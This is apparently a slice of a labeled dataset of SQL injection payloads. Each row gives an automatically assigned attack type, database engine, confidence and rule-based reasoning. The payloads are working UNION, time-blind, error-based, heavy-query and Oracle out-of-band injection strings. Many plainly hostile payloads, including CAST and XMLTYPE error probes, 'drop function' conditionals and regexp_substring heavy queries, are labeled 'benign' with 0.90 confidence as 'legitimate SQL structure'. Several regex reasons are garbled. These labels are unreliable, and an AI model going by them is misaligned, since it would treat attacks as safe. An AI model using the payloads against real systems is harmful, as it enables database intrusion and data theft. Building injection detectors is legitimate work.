id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24782,1 ) where 6116 = 6116 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
24783,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24784,1' ) where 3187 = 3187 order by 1#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24785,"1%' ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( '%' = '",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24786,"-5757%"" ) or 6872 = 6872 and ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24787,"1"" or sleep ( 5 ) and ""fbuo"" like ""fbuo",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24788,"1' ) ) as kfnt where 8090 = 8090 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
24789,-2992' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 'tjgt' = 'tjgt,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24790,"-3219"" ) order by 1--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24791,"1"" ) ) ) or sleep ( 5 ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24792,"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24793,"( select ( case when ( 1343 = 1343 ) then ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) else 1343 end ) from dual )",heavy_query,oracle,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24794,-6190' ) where 2621 = 2621 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24795,"1' ) ) as ezpq where 2976 = 2976 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24796,"1'|| ( select 'zqdn' where 6194 = 6194 union all select null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24797,"1"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ""acbq"" like ""acbq",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
24798,1' ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( 'ltki' = 'ltki,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24799,"1' ) as ezoa where 4915 = 4915 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24800,-8878' in boolean mode ) union all select 7785#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24801,1' ) ) and ( 7517 = 3423 ) *3423 and ( ( 'aenz' = 'aenz,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24802,-2797' ) ) ) union all select 5711#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24803,"1 ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 2303 = 2303",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24804,1' ) and ( 3020 = 3020 ) *6703 and ( 'botl' like 'botl,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24805,"iif ( 9875 = 8961,1,1/0 )",unknown,generic,0.50,Insufficient information to classify,1
24806,"-7843' where 5986 = 5986 or make_set ( 9354 = 9354,7185 ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24807,"-4669' union all select 9387,9387,9387,9387,9387,9387,9387,9387,9387,9387--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24808,"1"" where 3221 = 3221 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",error_based,generic,0.85,Signal match: updatexml → error_based (P4); confidence: 0.85,1
24809,-7466 where 5161 = 5161 or 3038 = 3038,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24810,"1%"" ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( ""%"" = """,error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
24811,"-4477' ) ) union all select 8444,8444,8444,8444,8444,8444,8444,8444--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24812,"1%' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and '%' = '",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
24813,1' and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24814,"1"" or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24815,"-4035' union all select 9540,9540,9540,9540,9540,9540,9540,9540,9540,9540--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24816,"-8999"" where 2821 = 2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24817,"1 ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 3039 = 3039",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24818,"1"" ) ) ) rlike sleep ( 5 ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24819,"1' in boolean mode ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) #",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24820,"1"" where 8672 = 8672 union all select null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24821,if ( 4907 = 9581 ) select 4907 else drop function apqw--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24822,"1' where 9222 = 9222 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24823,1 ) as itvm where 1482 = 1482,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24824,-6912' in boolean mode ) union all select 6012--,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24825,"-6334' ) union all select 3738,3738,3738,3738,3738,3738,3738,3738--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24826,"1'+ ( select pepf where 5071 = 5071 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24827,"1"" ) as lipa where 3450 = 3450 and make_set ( 8403 = 8403,8899 ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24828,"1' ) where 6081 = 6081 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24829,waitfor delay '0:0:5' and ( ( 'uvlf' = 'uvlf,time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
24830,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24831,"1"" ) where 2367 = 2367",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24832,-6616 ) order by 1--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24833,"1"" ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""kzcd"" = ""kzcd",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24834,-4137 ) ) as elxu where 5672 = 5672 order by 1--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24835,if ( 8812 = 7896 ) select 8812 else drop function xltk--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24836,-3559' ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24837,-7707' ) ) union all select 3172#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24838,waitfor delay '0:0:5'#,time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
24839,"-5082 ) ) union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24840,1' ) rlike ( select ( case when ( 2721 = 8716 ) then 1 else 0x28 end ) ) and ( 'dumt' = 'dumt,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24841,1' ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'pehq' like 'pehq,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24842,"1 ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24843,"-7796' ) union all select 4960,4960,4960,4960,4960,4960,4960,4960,4960,4960#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24844,"-7499%"" ) union all select 1893,1893,1893,1893,1893#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24845,1' where 2958 = 2958,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24846,"1%"" ) and 4595 = 4595#",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24847,1' ) as ftyp where 5851 = 5851 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
24848,"1%' ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( '%' = '",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
24849,1' in boolean mode ) and 7533 = 7533#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24850,"1'|| ( select 'yrau' where 7860 = 7860 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) ||'",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24851,1'|| ( select 'tisi' from dual where 1616 = 1616 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24852,"-9954"" ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ""bifi"" = ""bifi",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24853,"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'rpiz' like 'rpiz",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
24854,"-9953'|| ( select 'zljk' where 2886 = 2886 union all select 2886,2886,2886,2886,2886,2886,2886,2886,2886,2886#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24855,"1' in boolean mode ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24856,1' ) ) as fbjd where 8597 = 8597,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24857,1 ) ) as ipfy where 1189 = 1189,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24858,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( '%' = ',time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24859,1' ) ) as tlsl where 8467 = 8467,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24860,if ( 3392 = 4422 ) select 3392 else drop function xsqq--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24861,"-2718"" or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""xwbf"" = ""xwbf",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24862,1 where 6494 = 6494 and 8463 = 2760,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24863,"1' and elt ( 4249 = 4249,7259 )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24864,"1"" and 7533 = 7533 and ""btak"" like ""btak",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24865,"1 ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( 8600 = 8600",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24866,"1' where 5786 = 5786 and elt ( 1210 = 1210,sleep ( 5 ) ) --",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24867,"iif ( 1217 = 8831,1,1/0 )",unknown,generic,0.50,Insufficient information to classify,1
24868,-6540' ) where 5019 = 5019 or ( 8459 = 8459 ) *4906--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24869,"1"" and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ""ojpe"" like ""ojpe",time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
24870,"1%' and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24871,"1 ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24872,-8639 ) or 8138 = 6252,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24873,"-5667%' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( '%' = '",error_based,oracle,0.85,Signal match: ctxsys.drithsx → error_based (P4); DB signature: oracle,1
24874,"1%' ) ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24875,"1, ( case when 5514 = 9602 then 1 else null end )",unknown,generic,0.50,Insufficient information to classify,1
24876,"1%"" ) ) ) waitfor delay '0:0:5'--",time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
24877,"1"" ) where 4905 = 4905 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24878,"1 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) -- zvkh",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
24879,"-6198"" ) or make_set ( 3602 = 2178,2178 ) and ( ""xksq"" like ""xksq",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24880,1' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24881,"end and ( ( ""cxoi"" = ""cxoi",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24882,"-7627%"" ) ) union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24883,"1"" ) where 9086 = 9086 or sleep ( 5 ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24884,"1 ) as lejp where 5238 = 5238 union all select null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24885,"1"" ) ) as dpln where 4193 = 4193 rlike sleep ( 5 ) --",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
